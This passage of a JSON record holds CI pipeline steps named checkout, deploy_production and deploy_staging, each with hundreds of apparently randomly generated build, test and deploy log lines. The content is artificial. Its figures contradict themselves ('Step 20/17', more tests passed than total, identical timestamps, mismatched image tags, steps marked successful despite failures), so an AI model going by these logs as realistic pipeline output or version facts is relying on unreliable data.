          "Cache miss for key-7661",
          "WARNING: eslint has known vulnerabilities",
          "Minifying vendor.js",
          "Waiting...",
          "Transforming 120 files...",
          "npm notice: package.json updated",
          "Time: 13.133s",
          "[12:47:48] DEBUG: Loading configuration",
          "FAILED: test_db_connect",
          "Step 15/17: Installing dependencies",
          "Step 20/17: Building",
          "Environment: test",
          "Test Suites: 40 passed, 33 total",
          "WARNING: webpack has known vulnerabilities",
          "Using Node.js 15.17.10",
          "Building Docker image...",
          "Layer 5/12: RUN command",
          "Checking out develop branch",
          "Cache miss for key-4401",
          "Image pulled successfully",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "POST /upload - 200 (404ms)",
          "Using Python 3.11",
          "Artifact uploaded: dist.zip (31MB)",
          "[12:47:48] DEBUG: Query executed in 3ms",
          "npm install: resolved 682 packages",
          "[12:47:48] DEBUG: Memory usage: 1472MB",
          "Compiling utils/app.ts...",
          "Bundling runtime.css",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing lodash@1.6.8",
          "Compiling utils/app.ts...",
          "Step 4/23: Installing dependencies",
          "npm install: added 341 packages",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Cache hit for key-6901",
          "  PASS: unit/test_cache_hit.spec.js",
          "Coverage: 76% statements, 82% branches",
          "Cache saved successfully",
          "npm install: resolved 1056 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "pip: Collecting jest",
          "[12:47:48] INFO: Connecting to database",
          "Tests: 427 passed, 68 total",
          "Transforming 340 files...",
          "Completed.",
          "Tests: 410 passed, 451 total",
          "\u2713 Task completed in 1032ms",
          "Using Python 3.10",
          "Coverage: 78% statements, 82% branches",
          "[12:47:48] DEBUG: Loading configuration",
          "[12:47:48] DEBUG: Connection pool: 5 active",
          "Generating source maps...",
          "Using Python 3.10",
          "[12:47:48] ERROR: Connection failed",
          "WARNING: react has known vulnerabilities",
          "Environment: test",
          "Exception: TypeError",
          "\u2713 lint completed",
          "Generating source maps...",
          "Cache miss for key-4350",
          "Coverage: 93% statements, 98% branches",
          "Platform: win32-x64",
          "Creating production build...",
          "Ready.",
          "npm install: resolved 1309 packages",
          "[12:47:48] INFO: Connecting to database",
          "Compiling utils/app.ts...",
          "Coverage: 73% statements, 90% branches",
          "TLS handshake completed",
          "[12:47:48] DEBUG: Loading configuration",
          "[12:47:48] DEBUG: Query executed in 50ms",
          "  PASS: test_db_connect (391ms)",
          "Step 12/16: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/app.ts...",
          "Step 13/21: Running migrations",
          "[12:47:48] DEBUG: Loading configuration",
          "GET /api - 201 (49ms)",
          "Test Suites: 37 passed, 22 total",
          "Uploading artifact 'dist' (34 files)",
          "Step 6/24: Testing",
          "Transforming 152 files...",
          "[12:47:48] WARN: Deprecated API usage",
          "npm install: added 335 packages",
          "HEAD is now at d8477c8",
          "Test Suites: 47 passed, 22 total",
          "pip install: Successfully installed jest-5.5",
          "Cache invalidated: node_modules",
          "pip install: Successfully installed webpack-4.2",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:47:48] DEBUG: Memory usage: 1463MB",
          "WARNING: axios has known vulnerabilities",
          "Transforming 722 files...",
          "Connection established",
          "npm notice: package.json updated",
          "Installing lodash@3.9.2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "[12:47:48] INFO: Cache refreshed",
          "Tests: 416 passed, 213 total",
          "Minifying app.js",
          "Fetching submodules...",
          "\u2713 validate completed",
          "Coverage: 92% statements, 78% branches",
          "Step 12/21: Building",
          "[12:47:48] INFO: Cache refreshed",
          "Compiling components/index.js...",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Generating source maps...",
          "GET /status - 204 (44ms)",
          "Bundling vendor.js",
          "npm install: resolved 769 packages",
          "Creating production build...",
          "Compiling src/main.py...",
          "Done.",
          "TLS handshake completed",
          "Compiling lib/handler.rs...",
          "[12:47:48] DEBUG: Loading configuration",
          "Environment: production",
          "Cache miss for key-4581",
          "Installing express@5.14.9",
          "Layer 2/11: COPY command",
          "TLS handshake completed",
          "[12:47:48] DEBUG: Initializing service",
          "OK",
          "Cache restored successfully (17MB)",
          "npm notice: created a lockfile",
          "  PASS: test_auth_login (193ms)",
          "Cache saved successfully",
          "\u2713 Task completed in 2728ms",
          "Cache invalidated: node_modules",
          "[12:47:48] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:47:48] INFO: Request completed",
          "Completed.",
          "[12:47:48] DEBUG: Query executed in 41ms",
          "[12:47:48] INFO: Starting build process",
          "GET /api - 201 (90ms)",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Platform: darwin-arm64",
          "Cache invalidated: node_modules",
          "pip install: Successfully installed prettier-4.13",
          "yarn add: Done in 7.76s",
          "Snapshots: 50 passed, 49 total",
          "Bundling vendor.js",
          "Creating production build...",
          "\u2713 All checks passed",
          "pip: Collecting webpack",
          "Uploading artifact 'dist' (4 files)",
          "pip: Downloading webpack-2.7.tar.gz",
          "Step 16/15: Installing dependencies",
          "Optimizing 86 modules...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-11T12:48:46.024521",
        "finished_at": "2025-12-11T12:48:53.711651",
        "log_lines": [
          "=== Step: checkout ===",
          "  PASS: test_auth_login (129ms)",
          "\u2713 Step 'build' succeeded",
          "Verifying...",
          "npm notice: created a lockfile",
          "Ready.",
          "[12:47:48] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 1/23: Installing dependencies",
          "Compiling src/main.py...",
          "Step 8/24: Installing dependencies",
          "Cache invalidated: node_modules",
          "Uploading artifact 'dist' (42 files)",
          "[12:47:48] DEBUG: Connection pool: 9 active",
          "Generating source maps...",
          "Pushing to registry...",
          "Installing react@4.1.5",
          "[12:47:48] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (39 files)",
          "Step 10/19: Building",
          "Finished.",
          "Loading...",
          "Building Docker image...",
          "Cache saved successfully",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 17.40s",
          "Compiling src/handler.rs...",
          "npm notice: created a lockfile",
          "Step 19/24: Linting",
          "Cache invalidated: dependencies",
          "Step 10/15: Running migrations",
          "Cache miss for key-2912",
          "[12:47:48] INFO: Starting build process",
          "\u2713 deploy completed",
          "Cache invalidated: dependencies",
          "Ready.",
          "Layer 5/10: ENV command",
          "Optimizing 12 modules...",
          "pip: Installing build dependencies...",
          "\u2713 deploy completed",
          "Image pulled successfully",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] DEBUG: Initializing service",
          "Ready.",
          "[12:47:48] DEBUG: Query executed in 49ms",
          "yarn add: Done in 15.71s",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "FAILED: test_cache_hit",
          "HEAD is now at dd1106b",
          "Pushing to registry...",
          "Already up to date.",
          "Pushing to registry...",
          "Step 7/21: Running migrations",
          "[12:47:48] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "[12:47:48] INFO: Connecting to database",
          "Building Docker image...",
          "Coverage: 71% statements, 99% branches",
          "Cache saved successfully",
          "Checking out develop branch",
          "Optimizing 50 modules...",
          "Optimizing 47 modules...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: dist.zip (89MB)",
          "  PASS: e2e/test_user_create.spec.js",
          "pip: Downloading react-3.3.tar.gz",
          "Fetching from https://pypi.org/package.json",
          "Processing...",
          "Snapshots: 44 passed, 26 total",
          "  PASS: test_cache_hit (421ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "OK",
          "[12:47:48] INFO: Cache refreshed",
          "Step 20/19: Running migrations",
          "pip: Collecting express",
          "Completed.",
          "Checking out master branch",
          "Coverage: 95% statements, 76% branches",
          "Loading...",
          "[12:47:48] INFO: Request completed",
          "Time: 109.643s",
          "Test Suites: 34 passed, 16 total",
          "Cache invalidated: node_modules",
          "POST /api - 200 (162ms)",
          "Tests: 218 passed, 427 total",
          "Compiling utils/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'bugfix/task-722'",
          "Artifact downloaded: 7MB",
          "Cache saved successfully",
          "[12:47:48] DEBUG: Memory usage: 1293MB",
          "pip: Downloading jest-5.14.tar.gz",
          "Compiling utils/app.ts...",
          "Artifact uploaded: dist.zip (83MB)",
          "[12:47:48] INFO: Connecting to database",
          "OK",
          "[12:47:48] WARN: Deprecated API usage",
          "Layer 5/10: RUN command",
          "Snapshots: 45 passed, 49 total",
          "Done.",
          "Artifact downloaded: 38MB",
          "GET /status - 200 (55ms)",
          "Tests: 192 passed, 276 total",
          "Pushing to registry...",
          "[12:47:48] WARN: Deprecated API usage",
          "OK",
          "Completed.",
          "Time: 63.83s",
          "Step 15/22: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "Ready.",
          "Layer 5/12: COPY command",
          "[12:47:48] ERROR: Connection failed",
          "Optimizing 91 modules...",
          "Checking out master branch",
          "Generating source maps...",
          "Cache saved successfully",
          "yarn add: Done in 15.28s",
          "Compiling src/handler.rs...",
          "Ready.",
          "Cache saved successfully",
          "Cache hit for key-6333",
          "POST /data - 201 (126ms)",
          "Finished.",
          "Exception: NullPointerException",
          "Step 9/15: Deploying",
          "WARNING: jest has known vulnerabilities",
          "Fetching submodules...",
          "Building Docker image...",
          "Cache saved successfully",
          "Layer 9/8: COPY command",
          "[12:47:48] INFO: Request completed",
          "Step 5/25: Running migrations",
          "[12:47:48] WARN: Deprecated API usage",
          "Step 11/18: Testing",
          "Tests: 168 passed, 383 total",
          "Ran 33 tests in 24s",
          "Pulling image: alpine:3.11",
          "Generating source maps...",
          "Test Suites: 41 passed, 15 total",
          "pip: Collecting jest",
          "  PASS: test_auth_login (82ms)",
          "Building Docker image...",
          "pip: Collecting prettier",
          "  PASS: unit/test_auth_login.spec.js",
          "Ran 13 tests in 9s",
          "Pulling image: python:3.11",
          "Cache restored successfully (254MB)",
          "Cache miss for key-3228",
          "WARNING: prettier has known vulnerabilities",
          "Environment: production",
          "Generating source maps...",
          "Transforming 333 files...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:47:48] DEBUG: Connection pool: 15 active",
          "Test Suites: 32 passed, 18 total",
          "\u2713 All checks passed",
          "[12:47:48] INFO: Starting build process",
          "Done.",
          "Verifying...",
          "Environment: production",
          "Bundling styles.css",
          "Step 20/17: Linting",
          "Fetching from https://googleapis.com/package.json",
          "Processing...",
          "npm notice: created a lockfile",
          "pip: Downloading express-3.20.tar.gz",
          "Building Docker image...",
          "Uploading artifact 'coverage' (50 files)",
          "FAILED: test_cache_hit",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] INFO: Cache refreshed",
          "npm install: added 422 packages",
          "OK",
          "Using Node.js 20.2.5",
          "Cache restored successfully (200MB)",
          "pip: Downloading webpack-2.9.tar.gz",
          "npm notice: created a lockfile",
          "Verifying...",
          "[12:47:48] INFO: Processing request",
          "Fetching from https://github.com/package.json",
          "Pulling image: alpine:18",
          "Exception: TypeError",
          "Connection established",
          "Completed.",
          "[12:47:48] DEBUG: Loading configuration",
          "Cache miss for key-8677",
          "Image pulled successfully",
          "Step 18/20: Building",
          "Completed.",
          "[12:47:48] INFO: Processing request",
          "Step 3/15: Installing dependencies",
          "[12:47:48] INFO: Cache refreshed",
          "Success!",
          "Verifying...",
          "Loading...",
          "[12:47:48] INFO: Connecting to database",
          "Uploading artifact 'build' (12 files)",
          "\u2713 All checks passed",
          "Step 7/19: Installing dependencies",
          "pip: Installing build dependencies...",
          "pip: Collecting express",
          "Time: 89.243s",
          "OK",
          "Fetching from https://googleapis.com/package.json",
          "Cache invalidated: dependencies",
          "[12:47:48] DEBUG: Query executed in 26ms",
          "Completed.",
          "[12:47:48] INFO: Starting build process",
          "Platform: win32-x64",
          "Ran 160 tests in 13s",
          "Ready.",
          "TLS handshake completed",
          "pip install: Successfully installed webpack-2.0",
          "Cache restored successfully (408MB)",
          "Time: 72.340s",
          "Finished.",
          "Image pulled successfully",
          "Cache hit for key-9098",
          "Done.",
          "[12:47:48] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 35 passed, 49 total",
          "[12:47:48] DEBUG: Memory usage: 1451MB",
          "Fetching from https://docker.io/package.json",
          "Fetching from https://amazonaws.com/package.json",
          "Snapshots: 39 passed, 34 total",
          "Installing webpack@1.15.7",
          "[12:47:48] DEBUG: Query executed in 50ms",
          "Building Docker image...",
          "Step 14/25: Running migrations",
          "Layer 7/8: RUN command",
          "Connection established",
          "[12:47:48] INFO: Processing request",
          "pip: Downloading express-1.16.tar.gz",
          "Cache invalidated: dependencies",
          "Ran 63 tests in 14s",
          "Success!",
          "\u2717 build failed with exit code 89",
          "OK",
          "Using Python 3.11",
          "Generating source maps...",
          "Environment: production",
          "Cache restored successfully (430MB)",
          "\u2717 build failed with exit code 103",
          "npm install: added 305 packages",
          "  PASS: test_user_create (155ms)",
          "Exception: RuntimeError",
          "POST /data - 201 (87ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: dist.zip (64MB)",
          "[12:47:48] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:48] DEBUG: Connection pool: 13 active",
          "Switched to branch 'feature/task-785'",
          "WARNING: react has known vulnerabilities",
          "Step 2/21: Linting",
          "Pulling image: node:18",
          "Environment: staging",
          "Finished.",
          "Tests: 111 passed, 461 total",
          "TLS handshake completed",
          "\u2713 deploy completed",
          "Fetching from https://registry.npmjs.org/package.json",
          "Step 1/24: Building",
          "Step 10/18: Linting",
          "  PASS: e2e/test_api_health.spec.js",
          "npm notice: package.json updated",
          "Artifact downloaded: 20MB",
          "\u2713 Task completed in 879ms",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-11T12:48:53.711651",
        "finished_at": "2025-12-11T12:49:01.398781",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Compiling utils/handler.rs...",
          "Cache miss for key-9071",
          "Checking out master branch",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Compiling components/utils.go...",
          "Done.",
          "[12:47:48] DEBUG: Memory usage: 1968MB",
          "Exception: RuntimeError",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "Using Python 3.11",
          "[12:47:48] DEBUG: Connection pool: 3 active",
          "npm notice: package.json updated",
          "[12:47:48] WARN: Deprecated API usage",
          "Ready.",
          "Bundling main.css",
          "[12:47:48] WARN: Deprecated API usage",
          "Compiling lib/app.ts...",
          "pip install: Successfully installed prettier-5.15",
          "[12:47:48] INFO: Connecting to database",
          "[12:47:48] INFO: Connecting to database",
          "Tests: 393 passed, 318 total",
          "Time: 86.398s",
          "Artifact uploaded: build.tar.gz (19MB)",
          "yarn add: Done in 29.80s",
          "Artifact downloaded: 8MB",
          "NODE_ENV=development",
          "[12:47:48] INFO: Starting build process",
          "[12:47:48] WARN: Deprecated API usage",
          "FAILED: test_cache_hit",
          "[12:47:48] INFO: Cache refreshed",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 15/17: Deploying",
          "Fetching from https://googleapis.com/package.json",
          "Uploading artifact 'coverage' (14 files)",
          "Pulling image: node:18",
          "Compiling src/handler.rs...",
          "npm install: resolved 1544 packages",
          "npm install: added 390 packages",
          "Ran 71 tests in 58s",
          "\u2713 Task completed in 3420ms",
          "Done.",
          "Step 19/16: Installing dependencies",
          "Step 10/23: Building",
          "\u2713 deploy completed",
          "[12:47:48] ERROR: Connection failed",
          "[12:47:48] INFO: Processing request",
          "Building Docker image...",
          "\u2713 Task completed in 1154ms",
          "Done.",
          "Layer 7/10: ENV command",
          "pip install: Successfully installed webpack-2.6",
          "Step 2/20: Testing",
          "\u2717 build failed with exit code 4",
          "npm notice: created a lockfile",
          "Cache miss for key-5538",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at 423a99d",
          "pip: Downloading axios-3.4.tar.gz",
          "Bundling runtime.js",
          "Processing...",
          "TLS handshake completed",
          "HEAD is now at acead55",
          "Time: 20.146s",
          "  PASS: integration/test_auth_login.spec.js",
          "Test Suites: 14 passed, 37 total",
          "[12:47:48] INFO: Starting build process",
          "Environment: development",
          "GET /health - 201 (28ms)",
          "Pulling image: python:3.11",
          "Test Suites: 44 passed, 9 total",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling utils/main.py...",
          "Using Python 3.12",
          "\u2713 validate completed",
          "Platform: linux-x64",
          "Switched to branch 'hotfix/task-799'",
          "Cache miss for key-2045",
          "[12:47:48] INFO: Starting build process",
          "npm notice: created a lockfile",
          "[12:47:48] DEBUG: Initializing service",
          "npm install: added 375 packages",
          "pip: Downloading axios-1.2.tar.gz",
          "Coverage: 70% statements, 94% branches",
          "Compiling utils/app.ts...",
          "Switched to branch 'bugfix/task-710'",
          "\u2713 All checks passed",
          "  PASS: integration/test_db_connect.spec.js",
          "Test Suites: 12 passed, 26 total",
          "Connection established",
          "Success!",
          "Step 1/24: Linting",
          "Creating production build...",
          "Pulling image: node:3.11",
          "WARNING: eslint has known vulnerabilities",
          "Using Node.js 17.20.5",
          "Finished.",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "[12:47:48] DEBUG: Loading configuration",
          "[12:47:48] INFO: Request completed",
          "Environment: production",
          "Cache invalidated: build",
          "Transforming 389 files...",
          "[12:47:48] DEBUG: Memory usage: 347MB",
          "\u2713 lint completed",
          "yarn add: Done in 1.94s",
          "Time: 13.393s",
          "pip: Downloading webpack-4.16.tar.gz",
          "Tests: 448 passed, 418 total",
          "Compiling utils/handler.rs...",
          "[12:47:48] INFO: Processing request",
          "[12:47:48] DEBUG: Loading configuration",
          "npm install: resolved 844 packages",
          "  PASS: test_db_connect (348ms)",
          "Step 9/24: Running migrations",
          "npm install: resolved 1590 packages",
          "Cache miss for key-7816",
          "Bundling styles.js",
          "[12:47:48] DEBUG: Initializing service",
          "Using Node.js 14.18.8",
          "pip: Downloading webpack-2.0.tar.gz",
          "  PASS: test_api_health (59ms)",
          "Artifact downloaded: 17MB",
          "Connection established",
          "Platform: darwin-arm64",
          "Ran 127 tests in 45s",
          "Waiting...",
          "NODE_ENV=production",
          "Time: 108.621s",
          "[12:47:48] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-234'",
          "pip install: Successfully installed axios-5.3",
          "[12:47:48] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "Installing react@1.18.6",
          "WARNING: lodash has known vulnerabilities",
          "Step 3/25: Running migrations",
          "Cache invalidated: dependencies",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 42 passed, 10 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Tests: 75 passed, 199 total",
          "[12:47:48] DEBUG: Connection pool: 13 active",
          "npm notice: package.json updated",
          "Using Node.js 18.13.8",
          "\u2713 Task completed in 4532ms",
          "npm notice: created a lockfile",
          "yarn add: Done in 29.1s",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (43MB)",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache restored successfully (376MB)",
          "Connection established",
          "[12:47:48] DEBUG: Connection pool: 1 active",
          "Cache saved successfully",
          "npm install: added 137 packages",
          "Optimizing 100 modules...",
          "yarn add: Done in 16.3s",
          "pip install: Successfully installed express-4.14",
          "Already up to date.",
          "Pulling image: alpine:latest",
          "[12:47:48] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 8/19: Running migrations",
          "Transforming 830 files...",
          "pip: Downloading react-1.4.tar.gz",
          "TLS handshake completed",
          "[12:47:48] DEBUG: Query executed in 98ms",
          "GET /api - 204 (72ms)",
          "npm install: resolved 758 packages",
          "Cache hit for key-4839",
          "[12:47:48] WARN: Deprecated API usage",
          "Step 8/19: Deploying",
          "Bundling styles.js",
          "Cache miss for key-4682",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Compiling components/handler.rs...",
          "Cache restored successfully (29MB)",
          "Ready.",
          "pip: Installing build dependencies...",
          "  PASS: test_cache_hit (139ms)",
          "pip: Collecting react",
          "Platform: linux-x64",
          "\u2717 build failed with exit code 41",
          "Snapshots: 18 passed, 25 total",
          "Compiling src/main.py...",
          "[12:47:48] INFO: Request completed",
          "Ran 117 tests in 50s",
          "NODE_ENV=test",
          "Success!",
          "Building Docker image...",
          "\u2717 build failed with exit code 77",
          "[12:47:48] DEBUG: Query executed in 52ms",
          "[12:47:48] INFO: Starting build process",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Cache hit for key-2450",
          "Time: 104.191s",
          "TLS handshake completed",
          "Test Suites: 24 passed, 31 total",
          "WARNING: express has known vulnerabilities",
          "HEAD is now at e1640e2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "GET /api - 200 (92ms)",
          "Cache invalidated: build",
          "Compiling lib/main.py...",
          "FAILED: test_cache_hit",
          "Coverage: 76% statements, 94% branches",
          "\u2713 validate completed",
          "Compiling src/main.py...",
          "Optimizing 44 modules...",
          "yarn add: Done in 18.68s",
          "Already up to date.",
          "Layer 9/11: COPY command",
          "Pushing to registry...",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:48] DEBUG: Connection pool: 19 active",
          "[12:47:48] WARN: Deprecated API usage",
          "Waiting...",
          "Image pulled successfully",
          "HEAD is now at 6ef2170",
          "Step 17/21: Building",
          "[12:47:48] INFO: Cache refreshed",
          "Artifact downloaded: 26MB",
          "TLS handshake completed",
          "[12:47:48] INFO: Connecting to database",
          "Step 9/24: Linting",
          "[12:47:48] DEBUG: Query executed in 85ms",
          "Creating production build...",
          "Using Node.js 18.3.3",
          "Step 5/18: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/app.ts...",
          "[12:47:48] DEBUG: Connection pool: 16 active",
          "pip: Installing build dependencies...",
          "Snapshots: 9 passed, 4 total",
          "Finished.",
          "Cache invalidated: dependencies",
          "Cache restored successfully (250MB)",
          "Step 7/21: Running migrations",
          "Switched to branch 'bugfix/task-460'",
          "NODE_ENV=test",
          "Fetching from https://pypi.org/package.json",
          "Cache restored successfully (134MB)",
          "Already up to date.",
          "Step 9/19: Linting",
          "  PASS: test_user_create (388ms)",
          "Completed.",
          "pip: Downloading jest-5.4.tar.gz",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Node.js 15.1.0",
          "[12:47:48] INFO: Cache refreshed",
          "[12:47:48] DEBUG: Initializing service",
          "[12:47:48] DEBUG: Query executed in 59ms",
          "[12:47:48] INFO: Cache refreshed",
          "GET /status - 200 (65ms)",
          "Pulling image: alpine:latest",
          "Ready.",
          "Cache hit for key-5527",
          "[12:47:48] DEBUG: Initializing service",
          "Cache restored successfully (377MB)",
          "Finished.",
          "Loading...",
          "Finished.",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-11T12:49:01.398781",
        "finished_at": "2025-12-11T12:49:20.616607",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2713 lint completed",
          "Cache restored successfully (204MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:48] INFO: Starting build process",
          "\u2713 Step 'checkout' succeeded",
          "Pulling image: node:latest",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "[12:47:48] DEBUG: Connection pool: 10 active",
          "Bundling main.js",
          "Completed.",
          "Layer 9/15: RUN command",
          "[12:47:48] DEBUG: Loading configuration",
          "Coverage: 79% statements, 99% branches",
          "GET /health - 201 (68ms)",
          "Step 11/17: Running migrations",
          "npm notice: created a lockfile",
          "Ready.",
          "[12:47:48] ERROR: Connection failed",
          "Loading...",
          "Processing...",
          "Compiling lib/index.js...",
          "Cache invalidated: node_modules",
          "Fetching submodules...",
          "Bundling styles.js",
          "npm install: resolved 1678 packages",
          "Cache saved successfully",
          "Artifact downloaded: 18MB",
          "\u2713 package completed",
          "npm install: added 205 packages",
          "Loading...",
          "Artifact uploaded: dist.zip (88MB)",
          "Step 14/23: Testing",
          "NODE_ENV=production",
          "[12:47:48] DEBUG: Memory usage: 742MB",
          "Layer 7/13: ENV command",
          "\u2713 Step 'checkout' succeeded",
          "Checking out develop branch",
          "Completed.",
          "[12:47:48] INFO: Connecting to database",
          "[12:47:48] INFO: Processing request",
          "Fetching from https://docker.io/package.json",
          "[12:47:48] DEBUG: Loading configuration",
          "Compiling utils/utils.go...",
          "Step 15/22: Deploying",
          "Finished.",
          "Minifying vendor.js",
          "FAILED: test_user_create",
          "Ran 162 tests in 47s",
          "Compiling lib/index.js...",
          "Cache restored successfully (498MB)",
          "npm install: added 164 packages",
          "Verifying...",
          "[12:47:48] WARN: Deprecated API usage",
          "Cache hit for key-3526",
          "NODE_ENV=production",
          "FAILED: test_api_health",
          "Compiling utils/index.js...",
          "Compiling utils/service.java...",
          "Tests: 70 passed, 325 total",
          "Pushing to registry...",
          "Time: 102.42s",
          "Checking out develop branch",
          "Installing lodash@5.9.5",
          "[12:47:48] INFO: Request completed",
          "Step 7/25: Building",
          "npm install: resolved 1380 packages",
          "Finished.",
          "pip: Installing build dependencies...",
          "Compiling utils/main.py...",
          "yarn add: Done in 14.76s",
          "Pulling image: python:18",
          "Switched to branch 'feature/task-923'",
          "Completed.",
          "Layer 8/15: ENV command",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (61MB)",
          "[12:47:48] DEBUG: Query executed in 54ms",
          "Ready.",
          "Pushing to registry...",
          "[12:47:48] DEBUG: Memory usage: 975MB",
          "Environment: production",
          "Loading...",
          "Step 6/18: Installing dependencies",
          "[12:47:48] DEBUG: Loading configuration",
          "pip: Collecting lodash",
          "WARNING: axios has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Tests: 129 passed, 264 total",
          "yarn add: Done in 27.2s",
          "Artifact uploaded: build.tar.gz (47MB)",
          "npm install: added 285 packages",
          "Step 17/17: Running migrations",
          "Ran 42 tests in 15s",
          "Creating production build...",
          "[12:47:48] INFO: Processing request",
          "Compiling components/service.java...",
          "Step 12/18: Linting",
          "Layer 1/15: ENV command",
          "npm install: resolved 465 packages",
          "Completed.",
          "Exception: RuntimeError",
          "Layer 9/9: COPY command",
          "Bundling styles.css",
          "Transforming 655 files...",
          "Artifact downloaded: 37MB",
          "Step 11/24: Testing",
          "Step 8/20: Running migrations",
          "Compiling lib/app.ts...",
          "Step 15/22: Installing dependencies",
          "Pushing to registry...",
          "Done.",
          "  PASS: e2e/test_db_connect.spec.js",
          "Step 6/22: Building",
          "Bundling vendor.js",
          "\u2713 All checks passed",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:48] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Cache invalidated: build",
          "Compiling src/handler.rs...",
          "Step 14/24: Linting",
          "[12:47:48] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:48] DEBUG: Memory usage: 1186MB",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:47:48] DEBUG: Query executed in 41ms",
          "pip install: Successfully installed eslint-2.5",
          "WARNING: express has known vulnerabilities",
          "Creating production build...",
          "Loading...",
          "Ready.",
          "Cache miss for key-5733",
          "Layer 1/12: ENV command",
          "Snapshots: 37 passed, 41 total",
          "Done.",
          "Waiting...",
          "Bundling runtime.js",
          "\u2713 Step 'build' succeeded",
          "[12:47:48] INFO: Processing request",
          "npm notice: package.json updated",
          "Completed.",
          "Cache miss for key-7910",
          "Pushing to registry...",
          "Step 9/23: Running migrations",
          "Fetching submodules...",
          "Waiting...",
          "[12:47:48] ERROR: Connection failed",
          "yarn add: Done in 24.60s",
          "Cache saved successfully",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (11MB)",
          "Time: 34.943s",
          "Step 3/24: Installing dependencies",
          "FAILED: test_auth_login",
          "Cache invalidated: dependencies",
          "Tests: 376 passed, 257 total",
          "TLS handshake completed",
          "\u2717 build failed with exit code 81",
          "[12:47:48] INFO: Request completed",
          "Connection established",
          "Fetching submodules...",
          "Pulling image: python:3.11",
          "[12:47:48] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Ready.",
          "Cache saved successfully",
          "Fetching from https://amazonaws.com/package.json",
          "npm notice: package.json updated",
          "[12:47:48] INFO: Request completed",
          "Fetching submodules...",
          "Pulling image: python:latest",
          "yarn add: Done in 6.15s",
          "Switched to branch 'bugfix/task-234'",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Compiling components/service.java...",
          "[12:47:48] DEBUG: Initializing service",
          "Switched to branch 'hotfix/task-346'",
          "TLS handshake completed",
          "Step 14/25: Deploying",
          "pip: Collecting prettier",
          "Artifact downloaded: 15MB",
          "Success!",
          "[12:47:48] INFO: Processing request",
          "Using Node.js 15.20.10",
          "  PASS: test_cache_hit (162ms)",
          "Snapshots: 48 passed, 11 total",
          "[12:47:48] DEBUG: Query executed in 15ms",
          "Compiling lib/main.py...",
          "Processing...",
          "\u2713 Task completed in 2180ms",
          "Artifact downloaded: 47MB",
          "Cache hit for key-9953",
